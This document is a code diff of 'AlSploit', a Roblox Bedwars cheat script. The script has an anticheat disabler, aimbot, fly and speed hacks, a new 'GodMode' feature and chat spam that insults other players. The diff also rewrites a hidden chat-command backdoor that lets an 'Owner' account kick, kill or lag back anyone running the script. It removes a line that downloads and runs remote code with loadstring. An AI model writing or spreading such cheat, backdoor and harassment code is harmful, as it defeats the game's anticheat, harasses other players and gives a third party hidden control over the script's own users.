@@ -1,5 +1,4 @@
-local WhitelistedUsers = loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/AlSploit/main/Whitelisted"))()
-local Owner = "AlSploitRevamped"
+local Owner = "AlSploitGg"
 
 local LocalPlayer = game.Players.LocalPlayer
 
@@ -695,16 +694,16 @@ end
 local Settings = {}
 local Loaded = false
 
-local SaveFileName = "AlSploitConfigsSavingBedwars"
+local SaveFileName = "AlSploitConfigurationSavingBedwars"
 
 local function CreateSettingsFile()
 	Settings = {
 		NoPlacementCps = {Value = true, KeyBind = "..."},
 		ChestStealer = {Value = true, Range = 30, KeyBind = "..."},
 		InfiniteJump = {Value = true, KeyBind = "..."},
-		AutoClicker = {Value = true, Cps = 30, KeyBind = "..."},
+		AutoClicker = {Value = false, Cps = 30, KeyBind = "..."},
 		NoKnockBack = {Value = true, KeyBind = "..."},	
-		InfiniteFly = {Value = false, KeyBind = "..."},
+		InfiniteFly = {Value = false, KeyBind = "Z"},
 		DamageBoost = {Value = true, KeyBind = "..."},
 		ChatSpammer = {Value = false, Speed = 50, KeyBind = "..."},
 		AcDisabler = {Value = true, KeyBind = "..."},
@@ -722,18 +721,19 @@ local function CreateSettingsFile()
 		AntiVoid = {Value = true, Transparency = 0.65, KeyBind = "..."},
 		AutoBank = {Value = true, Range = 30, KeyBind = "..."},
 		HighJump = {Value = false, KeyBind = "..."},
-		PlayerTp = {Value = true, KeyBind = "..."},
+		PlayerTp = {Value = false, KeyBind = "..."},
 		AutoKit = {Value = true, KeyBind = "..."},
 		AutoBuy = {Value = true, KeyBind = "..."},
+		GodMode = {Value = true, KeyBind = "..."},
 		Sprint = {Value = true, KeyBind = "..."},
 		NoFall = {Value = true, KeyBind = "..."},
 		Aimbot = {Value = true, KeyBind = "...", ToolCheck = false},
 		Speed = {Value = true, Speed = 23, KeyBind = "..."},
 		Reach = {Value = true, KeyBind = "..."},
 		Nuker = {Value = true, Range = 30, BreakOres = true, KeyBind = "..."},
-		BedTp = {Value = true, KeyBind = "..."},
+		BedTp = {Value = false, KeyBind = "..."},
 		Cape = {Value = true, KeyBind = "..."},
-		Fly = {Value = false, KeyBind = "..."},
+		Fly = {Value = false, KeyBind = "X"},
 		Esp = {Value = true, KeyBind = "..."},
 		Fov = {Value = false, Fov = 100, KeyBind = "..."}
 	}
@@ -848,6 +848,7 @@ local AntiVoidPart = nil
 local DamageBoost = false
 local StartLevel = nil
 local ZephyrOrb = 0
+local GodModed = false
 local FlyValue = false
 local FlyDown = false
 local FlyUp = false
@@ -1344,27 +1345,27 @@ local function AutoToxic(Player)
 	local KillMessage = ""					
 
 	if Randomized == 0 then
-		KillMessage = "You are so bad u died. L" .. Player.Name .. " | AlSploit/Coco Wars on top"
+		KillMessage = "You are so bad u died. L" .. Player.Name .. " | AlSploit/Coco Script on top"
 	end
 
 	if Randomized ~= 0 then
-		KillMessage = "I could probably win without cheats. L" .. Player.Name .. " | AlSploit/Coco Wars on top"
+		KillMessage = "I could probably win without cheats. L" .. Player.Name .. " | AlSploit/Coco Script on top"
 	end
 
 	if Randomized == 2 then
-		KillMessage = "Clowns are the only ones we kill. L" .. Player.Name .. " | AlSploit/Coco Wars on top"
+		KillMessage = "Clowns are the only ones we kill. L" .. Player.Name .. " | AlSploit/Coco Script on top"
 	end
 
 	if Randomized == 3 then
-		KillMessage = "Rats. Imagine dying in a block game. L" .. Player.Name .. " | AlSploit/Coco Wars on top"
+		KillMessage = "Rats. Imagine dying in a block game. L" .. Player.Name .. " | AlSploit/Coco Script on top"
 	end
 
 	if Randomized == 4 then
-		KillMessage = ".gg/J6XkRGqTY3. L" .. Player.Name .. " | AlSploit/Coco Wars on top"
+		KillMessage = ".gg/J6XkRGqTY3. L" .. Player.Name .. " | AlSploit/Coco Script on top"
 	end
 
 	if Randomized == 5 then
-		KillMessage = "I ruined a good day for a good reason. L" .. Player.Name .. " | AlSploit/Coco Wars on top"
+		KillMessage = "I ruined a good day for a good reason. L" .. Player.Name .. " | AlSploit/Coco Script on top"
 	end
 
 	SendChatMessage(KillMessage)
@@ -1412,11 +1413,11 @@ local function ChatSpam()
 	local KillMessage = ""
 
 	if Randomized == 0 then
-		KillMessage = "AlSploit does more updates than Bedwars 💀. | AlSploit/Coco Wars on top"
+		KillMessage = "AlSploit does more updates than Bedwars 💀. | AlSploit/Coco Script on top"
 	end
 
 	if Randomized ~= 0 then
-		KillMessage = "SkidB4 is as bad as how you felt when your dad left you. | AlSploit/Coco Wars on top"
+		KillMessage = "SkidB4 is as bad as how you felt when your dad left you. | AlSploit/Coco Script on top"
 	end
 
 	if Randomized == 2 then
@@ -1424,15 +1425,15 @@ local function ChatSpam()
 	end
 
 	if Randomized == 3 then
-		KillMessage = "I am not cheating, my gaming chair is. | AlSploit/Coco Wars on top"
+		KillMessage = "I am not cheating, my gaming chair is. | AlSploit/Coco Script on top"
 	end
 
 	if Randomized == 4 then
-		KillMessage = "3 years now, and the anticheat is still the same. | AlSploit/Coco Wars on top"
+		KillMessage = "3 years now, and the anticheat is still the same. | AlSploit/Coco Script on top"
 	end
 
 	if Randomized == 5 then
-		KillMessage = "Kids in bedwars just keep getting worst. | AlSploit/Coco Wars on top"
+		KillMessage = "Kids in bedwars just keep getting worst. | AlSploit/Coco Script on top"
 	end
 
 	SendChatMessage(KillMessage)
@@ -1757,14 +1758,14 @@ function AutoBuy()
 			if HasItem("iron_chestplate") then
 				PurchaseItem(DiamondArmor)
 			end	
+			
+			if HasItem("stone_sword") and not HasItem("iron_chestplate") and not HasItem("diamond_chestplate") and not HasItem("emerald_chestplate") then
+				PurchaseItem(LeatherArmor)
+			end	
 
 			if HasItem("leather_chestplate") then
 				PurchaseItem(IronArmor)
-			end	
-
-			if HasItem("stone_sword") then
-				PurchaseItem(LeatherArmor)
-			end		
+			end					
 		end)
 
 		task.spawn(function()
@@ -1921,7 +1922,7 @@ local function InfFly()
 
 			task.wait(0.025)
 
-			WorkSpace.Gravity = 196.2
+			WorkSpace.Gravity = 50
 			LocalPlayer.Character.PrimaryPart.Anchored = false
 
 			task.wait(1)
@@ -1984,8 +1985,8 @@ local function FlyMe()
 			repeat
 				task.wait()
 
-				if tick() - FlyGroundTime <= 2.5 then
-					local MaxFlyTime = 2.5
+				if tick() - FlyGroundTime <= 2.4 then
+					local MaxFlyTime = 1.9
 					local FlyTime = DecimalRound(tick() - FlyGroundTime, 1)
 
 					NumberDisplay.Text = FlyTime		
@@ -2019,7 +2020,7 @@ local function FlyMe()
 				if FlyValue == true and IsAlive(LocalPlayer) then
 					FlyBodyVelocity.Velocity = Vector3.new(0, (FlyUp and 40 or 0) + (FlyDown and -40 or 0), 0)
 
-					if (tick() - FlyGroundTime) >= 2.5 then
+					if (tick() - FlyGroundTime) >= 2.4 then
 						local FlyTeleportPosition = LocalPlayer.Character.PrimaryPart.Position.Y
 
 						local FlyRaycastParameters = RaycastParams.new()
@@ -2131,6 +2132,7 @@ task.spawn(function()
 
 				LocalPlayer.Character.Humanoid.HipHeight = HipHeight
 				AnticheatDisabled = true
+                                CreateNotification(5, "Anti cheat Bypass")
 
 				if Elk and Elk:FindFirstChild("body_mesh") then
 					Elk:FindFirstChild("body_mesh"):Destroy()
@@ -2281,7 +2283,7 @@ task.spawn(function()
 					LocalPlayer:Kick("A staff has joined your game!")
 				end
 				
-				CreateNotification(60,  "A staff has joined your game!")	
+				CreateNotification(540,  "A staff has joined your game!")	
 			end)
 		end
 	end)
@@ -2317,6 +2319,18 @@ task.spawn(function()
 				if Health <= 0 and v.Team ~= LocalPlayer.Team and v ~= LocalPlayer and Settings.AutoToxic.Value == true then
 					AutoToxic(v)
 				end
+				
+				if Settings.GodMode.Value == true and Health > 30 and GodModed == true and v == LocalPlayer then
+					InfiniteFlyValue = false
+					GodModed = false
+				end
+				
+				if Settings.GodMode.Value == true and Health <= 30 and GodModed == false and InfiniteFlyValue == false and v == LocalPlayer then
+					InfiniteFlyValue = true
+					GodModed = true
+					
+					InfFly()
+				end
 			end)
 		end	
 
@@ -2330,6 +2344,18 @@ task.spawn(function()
 					v.Character.Humanoid.HealthChanged:Connect(function(Health)
 						if Health <= 0 and v.Team ~= LocalPlayer.Team and v ~= LocalPlayer and Settings.AutoToxic.Value == true then
 							AutoToxic(v)
+						end
+						
+						if Settings.GodMode.Value == true and Health > 30 and GodModed == true and v == LocalPlayer then
+							InfiniteFlyValue = false
+							GodModed = false
+						end
+
+						if Settings.GodMode.Value == true and Health <= 30 and GodModed == false and InfiniteFlyValue == false and v == LocalPlayer  then
+							InfiniteFlyValue = true
+							GodModed = true
+
+							InfFly()
 						end
 					end)
 				end
@@ -2382,12 +2408,6 @@ task.spawn(function()
 			local SpeedCFrame = LocalPlayer.Character.Humanoid.MoveDirection * SpeedValue * Delta
 
 			local Raycast = WorkSpace:Raycast(LocalPlayer.Character.PrimaryPart.Position, SpeedCFrame, SpeedRaycastParameters)
-
-			if Raycast then
-				SpeedCFrame = (Raycast.Position - LocalPlayer.Character.PrimaryPart.Position) 
-
-				LocalPlayer.Character.PrimaryPart.CFrame = LocalPlayer.Character.PrimaryPart.CFrame - SpeedCFrame
-			end
 
 			if not Raycast then
 				LocalPlayer.Character.PrimaryPart.CFrame = LocalPlayer.Character.PrimaryPart.CFrame + SpeedCFrame
@@ -3108,12 +3128,12 @@ task.spawn(function()
 		Settings.InfiniteFly.Value = CallBack
 
 		task.spawn(function()
-			if Settings.InfiniteFly.Value == true then
+			if Settings.InfiniteFly.Value == true and InfiniteFlyValue == false then
 				InfiniteFlyValue = true
 				InfFly()
 			end
 
-			if Settings.InfiniteFly.Value == false then
+			if Settings.InfiniteFly.Value == false and InfiniteFlyValue == true then
 				InfiniteFlyValue = false
 			end
 		end)
@@ -3206,6 +3226,50 @@ task.spawn(function()
 					end
 
 					if Settings.HighJump.Value == false then
+						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
+					end
+				end
+			end
+		end)
+	end)
+end)
+
+task.spawn(function()
+	local GodMode, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "GodMode", Settings.GodMode.Value, function(CallBack)
+		Settings.GodMode.Value = CallBack
+	end)
+
+	task.spawn(function()
+		local InstanceUI
+		local Value = false
+
+		DropDownButton.Activated:Connect(function()
+			Value = not Value
+
+			if Value == true then
+				InstanceUI = CreateKeyBind(BlatantTab, Settings.GodMode.KeyBind, LayoutOrder + 1, function(CallBack)
+					Settings.GodMode.KeyBind = CallBack
+				end)
+			end
+
+			if Value == false then
+				InstanceUI:Destroy()
+			end
+		end)
+	end)
+
+	task.spawn(function()
+		UserInputService.InputBegan:Connect(function(Input)
+			if not UserInputService:GetFocusedTextBox() then
+				if Input.KeyCode.Name == Settings.GodMode.KeyBind then
+					Settings.GodMode.Value = not Settings.GodMode.Value
+
+					if Settings.GodMode.Value == true then
+						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.635294, 0.313725, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.831373, 0.686275, 1))}
+					end
+
+					if Settings.GodMode.Value == false then
+						FlyValue = false
 						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
 					end
 				end
@@ -3870,7 +3934,7 @@ task.spawn(function()
 			Value = not Value
 
 			if Value == true then
-				InstanceUI = CreateKeyBind(BlatantTab, Settings.AutoBank.KeyBind, LayoutOrder + 1, function(CallBack)
+				InstanceUI = CreateKeyBind(UtilityTab, Settings.AutoBank.KeyBind, LayoutOrder + 1, function(CallBack)
 					Settings.AutoBank.KeyBind = CallBack
 				end)
 			end
@@ -3969,7 +4033,7 @@ task.spawn(function()
 			Value = not Value
 
 			if Value == true then
-				InstanceUI = CreateMiniToggle(UtilityTab, "Kick", Settings.AntiStaff.Kick, LayoutOrder + 2, function(CallBack)
+				InstanceUI = CreateMiniToggle(UtilityTab, "Kick YOU", Settings.AntiStaff.Kick, LayoutOrder + 2, function(CallBack)
 					Settings.AntiStaff.Kick = CallBack
 				end)
 			end
@@ -4259,7 +4323,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	local GalaxySky, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "RedSky", Settings.GalaxySky.Value, function(CallBack)
+	local GalaxySky, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "GalaxySky", Settings.GalaxySky.Value, function(CallBack)
 		Settings.GalaxySky.Value = CallBack
 
 		if Settings.GalaxySky.Value == true then
@@ -4267,7 +4331,7 @@ task.spawn(function()
 				LightingService.Sky.Parent = ReplicatedStorage
 
 				local Sky = Instance.new("Sky")
-				local ID = 14330582541
+				local ID = 11539578563
 
 				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
 				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
@@ -4328,13 +4392,13 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	local Indicators, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Indicators", Settings.Indicators.Value, function(CallBack)
+	local Indicators, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Damage Indicators", Settings.Indicators.Value, function(CallBack)
 		Settings.Indicators.Value = CallBack
 
 		local OldObj = debug.getupvalue(DamageIndicator, 10)
 
 		if Settings.Indicators.Value == true then
-			local Messages = {"AlSploit on top", "Best Client", "Best Config", "Coco Wars on top"}
+			local Messages = {"AlSploit on top", "Coco Alsploit Config", "inf", "EZ"}
 
 			debug.setupvalue(DamageIndicator, 10, {
 				Create = function(self, obj, ...)
@@ -4837,43 +4901,39 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	while task.wait(0.1) do
-		for i, v in next, game.Players:GetPlayers() do
-			v.Chatted:Connect(function(Message)
-				for i, v2 in pairs(WhitelistedUsers) do
-					if Message:lower() == ";kill default" and v.Name == v2.Name and v.Name ~= LocalPlayer then
-						LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-						LocalPlayer.Character.Humanoid.Health = 0	
-						
-						task.wait(0.1)
-						
-						LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-						LocalPlayer.Character.Humanoid.Health = 0
-					end
-
-					if Message:lower() == ";breakmap default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then
-						for i, v in pairs(CollectionService:GetTagged("block")) do
+	repeat
+		task.wait(1)
+		
+		for i, v in next, PlayerService:GetPlayers() do
+			v.Chatted:Connect(function(Message)				
+				if Message:lower() == ";kick default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+					task.spawn(function()
+						LocalPlayer:Kick("Kicked by AlSploit owner")
+					end)
+				end
+				
+				if Message:lower() == ";kill default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+					task.spawn(function()
+						KillHumanoid(0)
+					end)
+				end
+				
+				if Message:lower() == ";lagback default" and v.Name == Owner and LocalPlayer.Name ~=  Owner then
+					task.spawn(function()
+						LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(99999, 99999, 99999)
+					end)
+				end				
+				
+				if Message:lower() == ";breakmap default" and v.Name == Owner and LocalPlayer.Name ~=  Owner then
+					task.spawn(function()
+						for i, v in next, CollectionService:GetTagged("block") do
 							v:Destroy()
 						end
-					end
-
-					if Message:lower() == ";leave default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then
-						game:Shutdown()
-					end
-
-					if Message:lower() == ";lagback default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then
-						LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(9e9, 9e9, 9e9)
-					end	
-
-					if Message:lower() == ";kick default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then	
-						if v.Name == Owner then
-							LocalPlayer:Kick("Kicked by AlSploit Owner.")
-						end
-					end
+					end)
 				end
 			end)
 		end
-	end
+	until not game
 end)
 
 task.spawn(function()
@@ -4894,50 +4954,6 @@ task.spawn(function()
 
 	ViewModel.RightHand.RightWrist.C1 = C1 * CFrame.Angles(math.rad(0), math.rad(0), math.rad(RotationZ.Value))
 
-	CreateNotification(12, "Coco AlSploit Config has loaded!")
-        CreateNotification(12, "Fps Unlocked")
+	CreateNotification(5, "AlSploit has loaded!")
 	setfpscap(999)
 end)
-
-local TweenService = game:GetService("TweenService")
-local NeonWaterMark = Instance.new("ScreenGui")
-local TextLabel = Instance.new("TextLabel")
-local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
-
-NeonWaterMark.Name = "NeonWaterMark"
-NeonWaterMark.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-NeonWaterMark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-NeonWaterMark.ResetOnSpawn = false
-
-TextLabel.Parent = NeonWaterMark
-TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.BackgroundTransparency = 1.000
-TextLabel.BorderSizePixel = 0
-TextLabel.Position = UDim2.new(0, 0, 0, 0)
-TextLabel.Size = UDim2.new(0.2, 0, 0.15, 0)
-TextLabel.Font = Enum.Font.GothamBold
-TextLabel.Text = "Coco Alsploit Config discord.gg/J6XkRGqTY3"
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.TextScaled = true
-TextLabel.TextSize = 28.000
-TextLabel.TextWrapped = true
-TextLabel.TextXAlignment = Enum.TextXAlignment.Left
-
--- Add UITextSizeConstraint for dynamic text sizing
-UITextSizeConstraint.MaxTextSize = 28
-UITextSizeConstraint.MinTextSize = 14
-UITextSizeConstraint.Parent = TextLabel
-
--- Tweening function for rainbow color change
-local function changeColor()
-    local rainbowColor = Color3.fromHSV(tick() % 5 / 5, 1, 1)
-    local info = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
-    local tween = TweenService:Create(TextLabel, info, {TextColor3 = rainbowColor})
-    tween:Play()
-end
-
--- Run the color change function in a loop
-while true do
-    changeColor()
-    wait(1) -- Adjust the wait time for a smoother or faster color change
-end
